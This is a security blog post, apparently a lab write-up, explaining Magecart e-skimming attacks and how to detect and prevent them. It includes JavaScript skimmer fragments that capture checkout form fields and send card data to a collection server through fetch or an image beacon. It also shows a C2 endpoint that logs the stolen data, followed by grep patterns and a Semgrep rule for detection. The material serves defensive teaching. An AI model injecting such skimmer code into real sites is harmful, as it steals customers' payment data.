---
title: "Understanding Magecart: How E-Skimming Attacks Steal Payment Data"
slug: "understanding-magecart"
date: 2026-02-05
description: "A deep-dive into Lab 1 — how basic Magecart attacks compromise e-commerce sites to steal credit card data, and how to detect and prevent them."
categories: ["threat-intel"]
tags: ["magecart", "e-skimming", "javascript", "payment-security", "lab-writeup", "pci-dss"]
author: "PCI Oasis"
canonicalURL: "https://blog.pcioasis.com/posts/threat-intel/understanding-magecart/"
ShowToc: true
TocOpen: true
---

> **Educational Purpose Only.** This article and Lab 1 are strictly for educational purposes. Code examples demonstrate attack techniques to help security professionals understand and defend against them. Never use these techniques on systems you don't own.

## What is Magecart?

**Magecart** is not a single hacking group, but an umbrella term for multiple cybercriminal organizations that specialize in stealing payment card data from e-commerce websites. These attacks are also known as:

- **E-skimming** — digital version of physical card skimmers
- **Web skimming** — skimming data from web pages
- **Formjacking** — hijacking form submissions
- **Digital skimming** — generic term for online card theft

The name originated from early attacks targeting **Magento**-based shopping carts, but the techniques have evolved to target any website that processes payment information — Shopify, WooCommerce, custom e-commerce platforms, and more.

## Real-World Impact & Notable Breaches

Magecart attacks have caused massive financial and reputational damage worldwide. Lab 1 simulates techniques similar to these real-world breaches:

| Incident | Impact |
|---|---|
| British Airways (2018) | 380,000 customers affected; £20M GDPR fine |
| Ticketmaster (2018) | 40,000 victims |
| Newegg (2018) | 1-month persistent attack on major electronics retailer |
| Macy's (2019) | Customer payment data stolen |
| Forbes Magazine (2019) | Subscription page compromised |

Over **70,000+ websites** have been compromised by Magecart groups since 2015.

## Anatomy of the Attack

Classic Magecart attacks follow a consistent pattern that Lab 1 demonstrates in a controlled environment.

### Step 1: Initial Compromise

Attackers gain access to inject malicious JavaScript through:

- Compromised admin credentials (weak passwords, phishing)
- Exploiting CMS vulnerabilities (Magento, WooCommerce plugins)
- Supply chain attacks (compromising third-party scripts)
- Server-side attacks (SQL injection, RCE)

### Step 2: Code Injection

The attack involves **appending malicious code** to legitimate JavaScript files. In Lab 1, this is demonstrated in `checkout-compromised.js`:

```javascript
// ============================================================
// LEGITIMATE CHECKOUT CODE (lines 1-239)
// ============================================================
;(function () {
  'use strict'
  // Normal checkout validation, UI updates, etc.
})()

// ============================================================
// MALICIOUS CODE INJECTED BY ATTACKERS (lines 240+)
// In real attacks: heavily obfuscated, minified, hidden
// ============================================================
;(function () {
  setTimeout(function () {
    // Skimmer initialization with delay to avoid detection
  }, 500)
})()
```

> **Why two IIFE blocks?** Using separate Immediately Invoked Function Expressions ensures the malicious code runs independently without breaking legitimate checkout functionality. Customers complete purchases normally while their data is silently stolen.

### Step 3: Form Interception

The skimmer waits for payment form submission and captures all sensitive fields:

```javascript
form.addEventListener('submit', function (event) {
  const cardData = extractCardData()

  if (hasValidCardData(cardData)) {
    setTimeout(() => exfiltrateData(cardData), CONFIG.delay)
  }

  // CRITICAL: Allow legitimate checkout to continue
  // (No preventDefault() — victim doesn't notice anything wrong)
})
```

### Step 4: Data Extraction

The skimmer systematically queries for payment fields using multiple selector strategies:

```javascript
function extractCardData() {
  return {
    cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),
    cvv:        getFieldValue(['#cvv', '[name="cvv"]']),
    expiry:     getFieldValue(['#expiry', '[name="expiry"]']),
    cardholderName:  getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
    billingAddress:  getFieldValue(['#billing-address', '[name="billingAddress"]']),
    city:  getFieldValue(['#city', '[name="city"]']),
    zip:   getFieldValue(['#zip', '[name="zip"]']),
    email: getFieldValue(['#email', '[name="email"]']),
    metadata: {
      url:       window.location.href,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent
    }
  }
}
```

### Step 5: Data Exfiltration

Stolen data is sent to an attacker-controlled C2 server with a fetch/beacon fallback:

```javascript
function exfiltrateData(data) {
  // Primary: AJAX POST
  fetch(CONFIG.exfilUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
    mode: 'cors',
    credentials: 'omit'  // avoid sending cookies
  })
  .catch(() => {
    // Fallback: image beacon if fetch is blocked
    const img = new Image()
    img.src = CONFIG.exfilUrl + '?d=' + btoa(JSON.stringify(data))
  })
}
```

## The C2 (Command & Control) Server

Lab 1 includes a simulated attacker C2 server that demonstrates how stolen data is collected. Real attackers host C2 infrastructure on:

- Compromised legitimate servers (to avoid suspicion)
- Bulletproof hosting providers (resistant to takedowns)
- Domains mimicking legitimate services (e.g., `google-analytics-cdn.com`)

The C2 server in Lab 1 receives and logs stolen card data:

```javascript
app.post('/collect', async (req, res) => {
  const stolenData = req.body

  // Validate if card data is "sellable"
  const validation = validateCardData(stolenData)

  // Log to file (attackers use encrypted databases)
  await logStolenData(stolenData)

  // Return success to avoid alerting the skimmer
  res.status(200).json({ status: 'ok' })
})
```

**What attackers do with stolen data:**
- Sell on dark web marketplaces — $5–30 per card
- Use for fraudulent purchases of high-value goods
- Aggregate with other data to build complete identities
- Forward to money mules to cash out through intermediaries

## Lab 1 Technical Walkthrough

### File Structure

```
01-basic-magecart/
├── vulnerable-site/              # Target e-commerce website
│   ├── index.html                # Store homepage
│   ├── checkout.html             # Checkout page
│   └── js/
│       ├── checkout.js           # Original legitimate code
│       └── checkout-compromised.js  # Legitimate + skimmer
├── malicious-code/
│   └── c2-server/
│       ├── server.js             # Data collection server
│       └── dashboard.html        # Stolen data viewer
└── test/                         # Playwright test suite
```

### Key Detection Signatures

Lab 1 teaches you to identify these critical indicators:

**1. Dual IIFE pattern**

Two separate IIFEs in the same file — especially with a `setTimeout` wrapping the second block — is a strong indicator of injected code.

**2. CONFIG objects with external URLs**

```javascript
const CONFIG = {
  exfilUrl: '/lab1/c2/collect',  // external endpoint!
  delay: 100,
  debug: true
}
```

**3. Form event listeners that don't call `preventDefault()`**

Legitimate form handlers usually prevent default submission. Skimmers explicitly allow it to avoid detection.

**4. Network requests to non-payment domains**

POST requests during checkout to domains other than your payment processor are highly suspicious.

## Detection Methods

### Browser DevTools

Open DevTools (F12) and check:

1. **Network tab** — filter by "collect" or "beacon"; look for POST requests to unexpected domains
2. **Sources tab** — navigate to `checkout*.js` and search for `exfilUrl`, `CONFIG`, `extractCardData`
3. **Console tab** — enable "Preserve log" and look for `[SKIMMER]` log messages

### Static Analysis

```bash
# Exfiltration URLs
grep -r "exfilUrl\|c2Server\|collectUrl" --include="*.js" .

# Form event listeners
grep -r "addEventListener.*submit" --include="*.js" .

# Data extraction patterns
grep -r "cardNumber\|cvv.*expiry" --include="*.js" .

# Fetch/beacon patterns
grep -r "fetch.*POST\|new Image.*src" --include="*.js" .
```

### Semgrep Rule

```yaml
rules:
  - id: credit-card-exfiltration
    patterns:
      - pattern: fetch($URL, { ... body: $DATA ... })
      - metavariable-regex:
          metavariable: $DATA
          regex: '.*(card|cvv|expir).*'
    message: "Potential credit card data exfiltration"
    severity: ERROR
```

## Prevention Strategies

### Content Security Policy (CSP)

CSP is one of the most effective defenses. Restrict script sources and connection endpoints:

```http
Content-Security-Policy:
  script-src 'self' https://trusted-cdn.com;
  connect-src 'self' https://api.payment-provider.com;
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-violation-report;
```

### Subresource Integrity (SRI)

Ensure loaded scripts haven't been tampered with:

```html
<script src="checkout.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uyk..."
        crossorigin="anonymous"></script>
```

### Additional Defenses

- **File Integrity Monitoring (FIM)** — detect unauthorized changes to JavaScript files
- **Regular security audits** — review third-party scripts and dependencies
- **Multi-factor authentication** — protect admin accounts from compromise
- **Network monitoring** — alert on unexpected outbound connections during checkout
- **Payment iframes** — isolate payment forms from your domain's JavaScript context

## Key Takeaways

- Magecart attacks inject JavaScript to silently steal payment data
- Skimmers allow legitimate checkout to continue, hiding the theft
- Third-party scripts are a major attack vector
- CSP policies can effectively block unauthorized network requests
- Regular script auditing and SRI hashes provide defense-in-depth

## Try It Yourself

Ready to see these techniques in action? [Lab 1](https://labs.pcioasis.com/lab1) provides a safe, controlled environment to:

- Explore compromised JavaScript and compare it with the legitimate original
- Observe data exfiltration live in browser DevTools
- View the attacker's C2 dashboard with captured data
- Practice detection using the methods above
- Run automated Playwright tests to verify skimmer behavior

**Continue learning:**
- [Lab 2: DOM-Based Skimming](https://labs.pcioasis.com/lab2) — advanced DOM manipulation and real-time field monitoring
- [Lab 3: Browser Extension Hijacking](https://labs.pcioasis.com/lab3) — privileged API abuse and extension-based attacks
- [MITRE ATT&CK Matrix](https://labs.pcioasis.com/mitre-attack) — map e-skimming techniques to the framework
- [Interactive Threat Model](https://labs.pcioasis.com/threat-model) — visualize attack vectors

---

*We're participating in [Google Summer of Code](https://github.com/pci-tamper-protect/e-skimming-labs/blob/stg/docs/GOOGLE_SUMMER_OF_CODE_IDEAS.md). Help us build new attack labs, detection tools, or ML-based detection engines.*
